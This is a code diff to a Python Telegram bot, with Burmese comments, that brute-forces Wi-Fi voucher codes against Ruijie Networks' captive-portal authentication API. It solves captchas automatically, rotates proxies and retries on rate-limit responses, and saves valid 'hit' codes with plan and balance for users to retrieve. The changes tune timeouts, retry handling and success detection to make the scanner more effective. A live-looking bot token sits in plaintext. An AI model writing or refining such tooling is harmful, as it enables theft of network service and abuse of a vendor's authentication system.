@@ -29,11 +29,9 @@ ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
 TOKEN = "8864755007:AAFgeXU_eJGVTnK_nb13NlIlzIblWiepgYg"
 
-# Proxy List (HTTP Proxies)
+# Proxy List
 PROXY_LIST = [
-    "http://67.203.23.88:8081",
-    "http://66.151.34.89:80",
-    "http://163.181.207.214:9999",
+    # "http://123.45.67.89:8080",
 ]
 proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
 
@@ -174,7 +172,7 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
     context_data['current_code'] = code
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
     session_id = None
-    timeout = aiohttp.ClientTimeout(total=10, connect=3)
+    timeout = aiohttp.ClientTimeout(total=8, connect=3)
     
     proxy = next(proxy_pool) if proxy_pool else None
 
@@ -192,30 +190,34 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
                     context_data['expired'] += 1; return None
                 text = await Captcha_Text(image)
                 if not text or not await Varify_Captcha(task_session, session_id, text, proxy=proxy):
-                    context_data['expired'] += 1; return None
+                    context_data['expired'] += 1; continue
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=8) as req:
+                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(0.5); continue
-                    if 'logonUrl' in response or '"success":true' in response:
+                        context_data['retry_total'] += 1; await asyncio.sleep(0.3); continue
+                    
+                    if 'logonUrl' in response or '"success":true' in response or 'auth success' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
                             balance_display, plan_name = balance_info
-                            if not any(item['code'] == code for item in context_data['success_codes']):
-                                context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
-                                context_data['hits'] += 1
+                        else:
+                            balance_display, plan_name = "Active", "Voucher Plan"
 
-                                user_id = chat_obj.id
-                                async with db_lock:
-                                    cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
-                                    conn.commit()
-                            return True
-                    context_data['expired'] += 1; return None
+                        if not any(item['code'] == code for item in context_data['success_codes']):
+                            context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
+                            context_data['hits'] += 1
+
+                            user_id = chat_obj.id
+                            async with db_lock:
+                                cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
+                                conn.commit()
+                        return True
+                    break
         except:
-            context_data['expired'] += 1; return None
+            continue
     context_data['expired'] += 1
     return None
 
@@ -305,7 +307,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
         hits_count = context.user_data.get('hits', 0)
         checked_count = context.user_data.get('checked_total', 0)
         try:
-            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ。\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
+            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
         except:
             pass
 
@@ -464,7 +466,7 @@ async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cursor.execute("SELECT session_url FROM user_sessions WHERE user_id = ?", (user_id,))
     row = cursor.fetchone()
     if not row:
-        await query.message.reply_text("❌ ကျေးဇူးပြု၍ ပထမဦးစွာ `Session URL Setup` ဖြင့် URL ထည့်သွင်းပါရန်。", parse_mode="Markdown")
+        await query.message.reply_text("❌ ကျေးဇူးပြု၍ ပထမဦးစွာ `Session URL Setup` ဖြင့် URL ထည့်သွင်းပါရန်။", parse_mode="Markdown")
         return
 
     keyboard = InlineKeyboardMarkup([
@@ -486,7 +488,8 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 50", (user_id,))
+    # Database မှ သိမ်းဆည်းထားသမျှ Codes အားလုံးကို ကန့်သတ်ချက်မရှိ ထုတ်ယူမည်
+    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC", (user_id,))
     rows = cursor.fetchall()
 
     if not rows:
@@ -495,15 +498,21 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    result_text = f"💎 **Saved Codes (Latest {len(rows)})**\n\n"
-    for idx, item in enumerate(rows, 1):
-        result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"
+    # Telegram စာသားအရှည် ကန့်သတ်ချက် (4096 characters) ရှိသောကြောင့် အပိုင်းလိုက် (Chunks) ခွဲထုတ်ပေးမည်
+    chunk_size = 50
+    for i in range(0, len(rows), chunk_size):
+        chunk = rows[i:i + chunk_size]
+        result_text = f"💎 **Saved Codes ({i+1} - {i+len(chunk)} / {len(rows)})**\n\n"
+        for idx, item in enumerate(chunk, i + 1):
+            result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"
+        
+        if query:
+            await query.message.reply_text(result_text, parse_mode="Markdown")
+        else:
+            await update.message.reply_text(result_text, parse_mode="Markdown")
 
     if query:
-        await query.message.reply_text(result_text, parse_mode="Markdown")
         await query.answer()
-    else:
-        await update.message.reply_text(result_text, parse_mode="Markdown")
 
 async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
